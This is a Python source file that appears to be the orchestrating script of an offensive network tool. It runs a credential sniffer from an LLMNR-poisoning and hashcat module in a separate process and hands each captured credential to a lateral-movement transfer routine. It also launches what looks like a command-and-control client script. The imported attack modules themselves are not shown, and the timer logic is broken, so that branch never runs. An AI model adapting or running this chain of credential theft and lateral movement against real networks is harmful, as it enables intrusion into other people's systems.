import multiprocessing
import os
import subprocess
import time
import LlmnrPoisining.hashcat.sniffCredentials as sniffCredentials
import LateralMovement.transfer as transfer

def sniff(conn2):
    os.chdir('./LlmnrPoisining/hashcat/')
    sniffCredentials.main(conn2)


def main():
    # print('yo boiiiii')
    # print('trolololo')
    # f = open('./hi.txt', 'w')
    # f.write('works')
    # f.close()
    # print('dam fam')
    # t = time.time()
    # while (time.time() - t < 5):
    #     time.sleep(1)
    #     print(time.time() - t)
    #     pass
    # os.system('start 9.jpg')
    sniffer_conn, conn2 = multiprocessing.Pipe()
    sniffer = multiprocessing.Process(target=sniff, args=(conn2,))
    sniffer.start()
    # client = subprocess.Popen(['python', 'communication/client side/client.py'])

    while True:
        if sniffer_conn.poll():
            data = sniffer_conn.recv()
            print(data)
            os.chdir('./LateralMovement')
            transfer.main(*data)


        t = time.time()
        if (time.time() - t > 5):
            subprocess.Popen(['python', 'communication/client side/client.py'])
            t = time.time()


if __name__ == '__main__':
    main()

